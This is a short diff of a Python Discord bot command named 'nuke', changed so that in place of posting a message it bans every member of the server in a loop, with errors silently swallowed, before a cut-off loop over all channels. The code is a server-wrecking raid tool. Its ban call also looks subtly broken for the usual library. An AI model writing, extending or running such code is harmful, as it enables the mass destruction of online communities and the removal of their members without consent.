@@ -15,7 +15,7 @@ async def nuke (ctx):
     
     for i in ctx.guild.members:
         try:
-            await ctx.send ("ORU")
+            await ctx.ban (i)
         except:
             print ("oops")
     for j in ctx.guild.channels:
